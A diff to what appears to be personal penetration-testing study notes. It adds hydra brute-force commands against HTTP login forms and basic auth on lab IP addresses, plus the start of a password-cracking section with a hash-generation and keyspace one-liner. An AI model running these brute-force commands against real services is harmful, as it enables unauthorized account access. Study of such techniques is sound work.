@@ -11,6 +11,33 @@ http bruteforcing ::::
 
 sudo hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
 
+for basic authorization
+hydra -l admin -P 1000_common_passwords.txt -s 8090 -f 192.168.1.4 http-get /
+
+
+=======================================================================================================================================================
+password cracking  using hashcat and johntheripper
+
+generating hash::
+  echo -n "secret" | sha256sum
+ 
+ Calculating keyspace 
+   python3 -c "print(62**5)"    :{for 62 bit data password length 5}
+   
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
